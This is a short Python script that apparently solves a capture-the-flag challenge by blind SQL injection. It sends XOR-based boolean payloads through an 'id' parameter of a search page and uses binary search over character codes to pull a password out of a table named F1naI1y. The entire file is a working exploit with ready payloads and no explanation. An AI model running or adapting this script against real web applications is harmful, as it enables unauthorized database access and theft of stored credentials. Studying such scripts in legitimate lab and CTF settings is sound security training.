#!/usr/bin/env python3
import requests

url = "http://38bd0888-cf6a-43b6-b6bd-fa991cb62b1d.node5.buuoj.cn:81/search.php"

def check(payload):
    try:
        r = requests.get(url, params={"id": payload}, timeout=10)
        return "ERROR" in r.text
    except:
        return False

def get_length(payload_prefix, max_len=500):
    for i in range(1, max_len + 1):
        payload = f"1^(length(({payload_prefix}))={i})"
        if check(payload):
            return i
    return 0

def get_char(payload_prefix, pos):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        payload = f"1^(ascii(substr(({payload_prefix}),{pos},1))>{mid})"
        if check(payload):
            low = mid + 1
        else:
            high = mid
    return chr(low) if 32 <= low <= 126 else "?"

def get_string(payload_prefix, length):
    result = ""
    for i in range(1, length + 1):
        c = get_char(payload_prefix, i)
        result += c
        print(f"[+] Position {i}: {c} -> {result}")
    return result

# 获取 F1naI1y id=9 的完整 password
print("[*] Getting full password from F1naI1y id=9...")
password_query = "select(password)from(F1naI1y)where(id=9)"
password_len = get_length(password_query)
print(f"[+] Password length: {password_len}")

if password_len > 0:
    password = get_string(password_query, password_len)
    print(f"[+] Full Password: {password}")
